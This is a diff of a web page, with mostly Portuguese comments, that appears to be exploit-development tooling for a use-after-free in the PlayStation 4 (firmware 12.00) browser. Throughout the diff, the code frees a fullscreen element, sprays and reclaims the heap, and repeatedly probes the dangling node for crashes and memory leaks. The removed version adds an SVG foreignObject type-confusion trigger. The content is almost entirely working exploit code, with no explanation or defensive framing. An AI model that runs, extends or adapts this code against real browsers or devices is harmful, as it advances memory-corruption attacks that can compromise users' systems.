@@ -1,223 +1,158 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Massive C++ Probe</title>
+<title>PS4 12.00 - UAF Confirmation (Clean)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → SVG Confusion → Massive C++ Probe</h2>
+<h2>UAF Confirmation (No DOM Noise)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
 // ==========================
-// 🔒 LOG SEGURO
-// ==========================
+// 🔒 SAFE LOG
 let logBuffer = [];
-function log(msg) {
+function log(msg){
     try { console.log(msg); } catch(e){}
     logBuffer.push(msg);
 }
 
 // ==========================
-// HEAP SETUP (INALTERADO)
-// ==========================
-function setupHeap() {
-    let controllers = [];
-    for(let i = 0; i < 5000; i++) {
-        let arr = new Float64Array(8);
-        arr[0] = i;
-        controllers.push(arr);
+// HEAP PRESSURE (leve, sem poluir DOM)
+function heapPressure(){
+    let tmp = [];
+    for(let i=0;i<20000;i++){
+        tmp.push(new ArrayBuffer(0x1000));
     }
-    return controllers;
 }
 
 // ==========================
-// FULLSCREEN (INALTERADO)
-// ==========================
-function setupFullscreen() {
+// FULLSCREEN TARGET (SEM innerHTML!)
+function setupFullscreen(){
+
     let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+
+    // 🔒 SEM innerHTML → evita TextNode falso
+    fsTarget.textContent = "X";
+
     Object.assign(fsTarget.style,{
-        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
+        background:"black",
+        width:"100%",
+        height:"100%",
+        position:"absolute",
+        top:"0",
+        left:"0"
     });
+
     document.body.appendChild(fsTarget);
+
     fsTarget.webkitRequestFullscreen?.();
+
     return fsTarget;
 }
 
 // ==========================
-// 💣 RECLAIM (Mistura do seu ajuste fino com a estabilidade original)
-// ==========================
-function preciseReclaim(size) {
-    log("[*] Reclaim size = " + size);
-    for (let i = 0; i < 3000; i++) {
-        let el = document.createElement("div");
-        document.body.appendChild(el);
-        el.remove();
-    }
-    for (let i = 0; i < size; i++) {
-        let el = document.createElement("div");
-        el.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>CONTROL_" + i + "</h1>";
-        Object.assign(el.style,{
-            background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
-        });
-        document.body.appendChild(el);
-    }
-}
+// 🔬 DANGLING POINTER TEST
+function probe(fsTarget){
 
-// ==========================
-// 💥 SVG CONFUSION (O GATILHO ESTÁ DE VOLTA!)
-// ==========================
-function inject(child){
-    try{
-        child.outerHTML = `<svg><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">AAAA</div></foreignObject></svg>`;
-        log("[*] payload injected");
-    }catch(e){
-        log("[UAF] inject crash");
-    }
-}
-
-// ==========================
-// 🔬 MASSIVE PROBE (O TESTE ABSOLUTO)
-// ==========================
-function massiveProbe(fsTarget) {
-    log("---- MASSIVE PROBE ----");
+    log("---- PROBE ----");
 
     try {
-        let n = fsTarget.firstChild;
-        if (!n) {
-            log("[!] Zumbi sumiu!");
-            return;
+
+        // 🔹 Estado estrutural
+        log("[CHECK] isConnected = " + fsTarget.isConnected);
+        log("[CHECK] parent = " + fsTarget.parentNode);
+        log("[CHECK] nodeType = " + fsTarget.nodeType);
+
+        // 🔹 Acesso DOM
+        try {
+            let v = fsTarget.textContent;
+            log("[CHECK] textContent OK = " + v);
+        } catch(e) {
+            log("[UAF] textContent crash");
         }
 
-        // Se for o SVG (Tipo 1), começamos o bombardeio
-        if(n.nodeType === 1) {
-            
-            // 1. BATERIA DE STRINGS E CONTEÚDO
-            try { 
-                let html = n.innerHTML; 
-                if(html && !html.includes("foreignObject")) log("[LEAK] innerHTML modificado: " + html.substring(0, 30));
-            } catch(e) { log("[CRASH] innerHTML"); }
-
-            try { 
-                let outer = n.outerHTML; 
-                if(outer && !outer.includes("svg")) log("[LEAK] outerHTML corrompido!");
-            } catch(e) { log("[CRASH] outerHTML"); }
-
-            // 2. BATERIA DE ÁRVORE E PONTEIROS (DOM Tree)
-            try { 
-                let p = n.parentNode; 
-                if(p !== fsTarget) log("[LEAK] parentNode aponta pro além!");
-            } catch(e) { log("[CRASH] parentNode"); }
-
-            try { 
-                let cLen = n.childNodes.length; 
-                if(cLen > 10 || cLen === 0) log("[LEAK] childNodes length louco: " + cLen);
-            } catch(e) { log("[CRASH] childNodes"); }
-
-            // 3. BATERIA DE ATRIBUTOS
-            try { 
-                let id = n.id; 
-                if(id) log("[LEAK] id: " + id);
-            } catch(e) { log("[CRASH] id"); }
-
-            try { 
-                let cls = n.className; 
-                let cVal = cls.baseVal || cls;
-                if(typeof cVal === 'string' && cVal.length > 0) log("[LEAK] className: " + cVal.substring(0,20));
-            } catch(e) { log("[CRASH] className"); }
-
-            // 4. BATERIA DE LAYOUT C++ (RenderTree)
-            try { 
-                let h = n.offsetHeight; 
-                if(h > 5000 || h < 0) log("[LEAK] offsetHeight bizarro: " + h);
-            } catch(e) { log("[CRASH] offsetHeight"); }
-
-            try { 
-                let rect = n.getBoundingClientRect(); 
-                if(rect.width > 5000 || rect.width < 0) log("[LEAK] Rect Width bizarro: " + rect.width);
-            } catch(e) { log("[CRASH] getBoundingClientRect"); }
-
-            // 5. BATERIA ESPECÍFICA SVG (Matemática C++)
-            try { 
-                let scale = n.currentScale; 
-                if(scale !== 1 && scale !== 0) log("[LEAK] currentScale: " + scale);
-            } catch(e) { log("[CRASH] currentScale"); }
-
-            try { 
-                let tx = n.currentTranslate.x; 
-                if(tx !== 0) log("[LEAK] Translate X: " + tx);
-            } catch(e) { log("[CRASH] currentTranslate"); }
-
-            // 6. BATERIA DE EXECUÇÃO (Métodos perigosos)
-            try { n.hasAttributes(); } catch(e) { log("[CRASH] hasAttributes()"); }
-            try { n.cloneNode(false); } catch(e) { log("[CRASH] cloneNode()"); }
-
-        } else {
-            log("[!] Objeto não é um elemento. Tipo: " + n.nodeType);
+        // 🔹 Escrita
+        try {
+            fsTarget.textContent = "A";
+            log("[CHECK] write OK");
+        } catch(e) {
+            log("[UAF] write crash");
         }
 
-    } catch(e) {
-        log("[UAF] Massive Probe falhou catastroficamente");
+        // 🔹 Layout (muito importante)
+        try {
+            let r = fsTarget.getBoundingClientRect();
+            log("[CHECK] layout OK = " + r.width);
+        } catch(e) {
+            log("[UAF] layout crash");
+        }
+
+        // 🔹 Clone (acessa estrutura interna)
+        try {
+            let c = fsTarget.cloneNode(true);
+            log("[CHECK] clone OK");
+        } catch(e) {
+            log("[UAF] clone crash");
+        }
+
+    } catch(e){
+        log("[UAF] acesso geral crash");
     }
 }
 
 // ==========================
 // TRIGGER (INALTERADO)
-// ==========================
-function trigger(fsTarget) {
+function trigger(fsTarget){
+
     log("[*] Trigger");
 
     try {
+
         fsTarget.remove();
-        if (document.webkitIsFullScreen || document.fullscreenElement) {
+
+        if(document.webkitIsFullScreen || document.fullscreenElement){
             document.webkitExitFullscreen?.();
         }
-    } catch(e) {
-        log("[ERRO]");
+
+    } catch(e){
+        log("[ERRO trigger]");
     }
 
-    // Seu array de tamanhos
-    let sizes = [1500, 2000, 2500, 3000];
+    // 🔥 pressão de heap pós-free
+    setTimeout(heapPressure, 0);
+    setTimeout(heapPressure, 50);
+    setTimeout(heapPressure, 100);
 
-    sizes.forEach((size, idx) => {
-        setTimeout(() => preciseReclaim(size), idx * 50);
-    });
+    // 🔬 probes repetidos (importante)
+    setTimeout(()=>probe(fsTarget), 10);
+    setTimeout(()=>probe(fsTarget), 50);
+    setTimeout(()=>probe(fsTarget), 100);
+    setTimeout(()=>probe(fsTarget), 200);
 
-    // Injeção do Payload que cria o zumbi
-    setTimeout(() => {
-        try {
-            let child = fsTarget.firstChild;
-            if(child) inject(child);
-        } catch(e) {}
-    }, 30);
-
-    // O bombardeio de Probes
-    setTimeout(() => massiveProbe(fsTarget), 100);
-    setTimeout(() => massiveProbe(fsTarget), 180);
-    setTimeout(() => massiveProbe(fsTarget), 260);
-
-    setTimeout(() => {
+    // dump final
+    setTimeout(()=>{
         alert(logBuffer.join("\n"));
-    }, 450);
+    }, 400);
 
-    setTimeout(() => location.reload(), 600);
+    // ⚠️ timing original
+    setTimeout(()=>location.reload(), 500);
 }
 
 // ==========================
 // MAIN
-// ==========================
-function runTest() {
-    log("[*] Iniciando Massive C++ Probe");
+function runTest(){
 
-    let controllers = setupHeap();
+    log("[*] Iniciando teste");
+
     let fsTarget = setupFullscreen();
 
-    window.onblur = function() {
+    window.onblur = function(){
         log("[*] onblur");
-        setTimeout(() => trigger(fsTarget), 3000);
+        setTimeout(()=>trigger(fsTarget), 3000);
     };
 }
 
